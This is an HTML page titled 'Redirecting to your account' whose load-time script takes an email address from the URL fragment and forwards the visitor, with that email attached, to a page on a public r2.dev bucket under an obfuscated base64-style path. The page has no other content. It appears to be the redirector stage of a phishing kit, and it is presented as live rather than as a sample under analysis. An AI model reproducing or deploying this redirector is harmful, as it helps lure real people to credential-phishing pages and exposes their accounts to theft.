<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to your account</title>
    <script type="text/javascript">
        function isValidEmail(email) {
            // Simple email validation regex
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailPattern.test(email);
        }

        function redirect() {
            var url = window.location.href;
            var emailParam = url.split("#email=")[1];

            if (emailParam && isValidEmail(emailParam)) {
                var newUrl = "https://pub-e27f2e4fca0c490aa7febfc376f1e927.r2.dev/Y3VybCBodHRwczovL2FwaS5jbG91ZGZsYXJlLmNvbS9jbGllbnQvdjQvXAphY2NvdW50cy8xMDRkMjM5MGJlODRmZTQ2OWFjYmZlYzcyN2FjZDdkMS9yMi9idWNrZXRzIFwKCSAtSCAnQ29udGVudC1U.html#" + emailParam;
                window.location.href = newUrl;
            } else if (!emailParam) {
                window.location.href = "https://pub-e27f2e4fca0c490aa7febfc376f1e927.r2.dev/Y3VybCBodHRwczovL2FwaS5jbG91ZGZsYXJlLmNvbS9jbGllbnQvdjQvXAphY2NvdW50cy8xMDRkMjM5MGJlODRmZTQ2OWFjYmZlYzcyN2FjZDdkMS9yMi9idWNrZXRzIFwKCSAtSCAnQ29udGVudC1U.html#email=";
            }
        }
    </script>
</head>
<body onload="redirect()">
</body>
</html>
